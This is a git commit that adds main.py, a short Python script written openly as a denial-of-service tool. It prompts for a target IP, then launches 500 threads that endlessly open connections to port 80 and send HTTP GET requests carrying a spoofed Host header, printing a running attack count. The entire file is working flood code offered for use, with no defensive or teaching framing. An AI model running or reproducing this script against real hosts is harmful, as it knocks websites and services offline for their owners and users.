c8187e3e4b7d122e65ecf5aba0d68313a5d0511e
Zahin Tajwar <74396943+Zahin-Tajwar@users.noreply.github.com>
2021-04-23 15:09:00 +0600

    Add files via upload

---
+++ main.py
@@ -0,0 +1,25 @@
+import socket
+import threading
+
+target = input("Enter target IP: ")
+fake_ip = '161.202.226.194'
+port = 80
+
+attack_num = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
